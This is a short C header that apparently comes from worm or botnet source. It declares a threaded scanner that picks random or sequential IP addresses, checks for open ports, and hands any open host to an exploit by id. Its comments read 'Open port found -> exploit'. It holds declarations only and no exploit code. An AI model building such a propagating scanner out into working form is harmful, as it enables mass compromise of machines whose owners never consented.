





#ifndef __SCANNER_H__
#define __SCANNER_H__

enum ScanStatus_e 
{
	SCAN_STATUS_IDLE,					// Waiting for a IP to scan
	SCAN_STATUS_SCAN,					// Scan variables initialised

	SCAN_STATUS_SCANNING,				// Scanning the IP
	SCAN_STATUS_OPEN,					// Open port found -> exploit
	SCAN_STATUS_CLOSED					// Port closed -> useless
};

struct ScannerHandler_s
{
	DWORD			dwStartIp;			// IP to start scanning on
	unsigned short	usPort;				// Port to scan on
	unsigned int	iExploitId;			// Pointer to the exploit id
	int				iDelay;				// Delay till we consider a timeout - TODO: automate
	int				iMinutes;			// Time in minutes to scan
	int				iThreads;			// Sockets to initialise for the scanner
	int				iScanType;			// 0: Random scan   --  1: Sequental scan
	bool			bLogicScan;			// If set to true exploit all on that port
};

struct ScannerThreadHandler_s
{
	ScanStatus_e	pScanStatus;		// Pointer to the scanstatus enum
	DWORD			dwCurrentIp;		// Ip this thread is currently scanning
	unsigned short	usPort;				// Port to scan on
	int				iDelay;				// Delay till we reached time-out
	HANDLE			hThread;			// Handler to the thread for cleaning up
};

void			ScanThread(ScannerHandler_s *pScannerHandler);
bool			CheckOpenPort(unsigned long ulIp, unsigned short usPort, int iDelay);
char*			GetIP(unsigned long ulIp);
unsigned long	GetRandomIP();

#endif // __SCANNER_H__